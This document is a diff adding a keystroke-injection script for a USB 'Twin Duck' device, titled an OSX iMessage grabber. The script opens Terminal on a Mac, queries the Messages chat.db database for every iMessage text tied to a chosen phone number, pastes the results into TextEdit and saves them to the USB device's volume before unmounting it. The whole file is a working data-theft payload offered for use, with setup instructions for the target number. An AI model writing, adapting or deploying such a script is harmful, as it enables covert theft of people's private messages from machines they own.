@@ -1,0 +1,55 @@
+REM OSX IMESSAGE GRABBER FOR TWIN DUCK 
+REM this will query the chat.db based on a number give to it in the query
+REM Raymon Hardy
+REM You should replace MICRO in /Volumes/MICRO with your ducky name
+REM You should replace number in the WHERE clause of the query with something like "+190874....."
+DELAY 500
+GUI SPACE
+DELAY 150
+STRING Terminal
+DELAY 500
+ENTER
+DELAY 300
+STRING sqlite3 ~/Library/Messages/chat.db
+DELAY 300
+ENTER
+DELAY 300
+STRING SELECT text FROM `message` WHERE handle_id=(SELECT ROWID FROM `handle` WHERE id="+number" AND service="iMessage");
+DELAY 500
+ENTER
+DELAY 500
+COMMAND A
+DELAY 150
+COMMAND C
+STRING .quit
+DELAY 150
+ENTER
+COMMAND Q
+DELAY 300
+GUI SPACE
+DELAY 150
+STRING textEdit
+DELAY 500
+ENTER
+DELAY 500
+COMMAND N
+DELAY 500
+COMMAND V
+DELAY 500
+COMMAND S
+DELAY 500
+DELETE
+DELAY 500
+STRING /
+DELAY 300
+STRING Volumes/MICRO
+DELAY 500
+ENTER
+DELAY 500
+STRING query
+DELAY 500
+ENTER
+DELAY 300
+COMMAND Q
+DELAY 500
+STRING diskutil umount /Volumes/MICRO
